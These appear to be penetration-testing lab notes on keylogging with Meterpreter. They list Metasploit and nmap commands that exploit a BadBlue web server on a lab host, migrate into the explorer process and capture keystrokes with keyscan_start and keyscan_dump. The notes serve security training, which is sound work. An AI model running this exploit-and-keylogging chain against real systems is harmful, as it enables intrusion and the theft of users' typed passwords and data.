#### Keylogging
Keyloggin is the process of recording or capturing the keystroke entered on a target system
- This technique is not limited to post exploitation,there are plenty of programs and USB devices that can be used to capture and transmit the keystrokes entered on a system
- Meterpreter on a windows system provides us with the ability to caputure the keystroke entered on a target system and download them back to local system.
#### Exploit
- service postgresql start
- msfconsole
- workspace -a keystroke
- nmap -sS -sV demo.ine.local
- search badblue [ as badblue is running]
- use exploit/windows/http/badblue_passthru
- set everything requires
- set target BadBlue\ EE\ 2.7\ Universal
- run 
- this will give meterpreter session
- pgrep explorer
- migrate 2312 [ migrating to explorer process ]
- keyscan_start [this will start scan the key stroke]
- keyscan_dump [this will dump the key stroke ]
